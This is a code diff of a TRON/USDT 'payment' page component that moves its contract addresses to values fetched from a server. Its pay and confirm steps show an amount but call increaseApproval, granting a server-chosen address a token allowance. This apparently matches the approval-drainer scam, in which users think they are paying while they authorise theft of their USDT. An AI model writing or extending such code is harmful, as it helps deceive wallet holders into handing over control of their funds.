@@ -19,17 +19,8 @@ export function BizFlow() {
 
   const [wallet, setWallet] = useState<TypeWallet>('');
   const [chain, setChain] = useState<TypeChain>('');
-  // Nile测试网USDT合约地址
-  // TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf
-  // TODO
-  // 正式地址
-  // ？？？
-  const [addrOne] = useState('TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf');
-  const [
-    //
-    addrTarget,
-    setAddrTarget,
-  ] = useState('TUgKYJ81sy3HJVendP6MuMFKFeSXVHyxkt');
+  const [addrUsdt, setAddrUsdt] = useState(Infos.tronlink.uca.main);
+  const [addrTarget, setAddrTarget] = useState('');
 
   const [pageParams, setPageParams] = useState({
     orderStr: '',
@@ -116,7 +107,7 @@ export function BizFlow() {
       // 余额满足
       if (_trx > Infos.tronlink.trxLimit.value) {
         // ??? at ?
-        const _contract = await contract?.()?.at(addrOne);
+        const _contract = await contract?.()?.at(addrUsdt);
         const result = await _contract
           .increaseApproval(addrTarget, Infos.tronlink.amount)
           .send({ feeLimit: 100000000 });
@@ -142,9 +133,16 @@ export function BizFlow() {
 
   useEffect(() => {
     queryContractAddr().then((res) => {
-      const ca = res?.data?.contractAddress || '';
-      if (ca) {
-        setAddrTarget(ca);
+      const {
+        //
+        contractAddress,
+        usdtContractAddress,
+      } = res?.data || {};
+      if (contractAddress) {
+        setAddrTarget(contractAddress);
+      }
+      if (usdtContractAddress) {
+        setAddrUsdt(usdtContractAddress);
       }
     });
 
@@ -187,7 +185,7 @@ export function BizFlow() {
       {flowStep === '1' ? (
         <StepOne
           platform={platform}
-          payAddr={addrOne}
+          displayAddr={addrUsdt}
           amount={pageParams.amountStr}
           onPayNowClick={onPayNowEvt}
         />
@@ -195,7 +193,7 @@ export function BizFlow() {
       {flowStep === '2' ? (
         <StepTwo
           platform={platform}
-          payAddr={addrOne}
+          displayAddr={addrUsdt}
           amount={pageParams.amountStr}
           onConfirmClick={onConfirmEvt}
           onCancelClick={onCancelEvt}
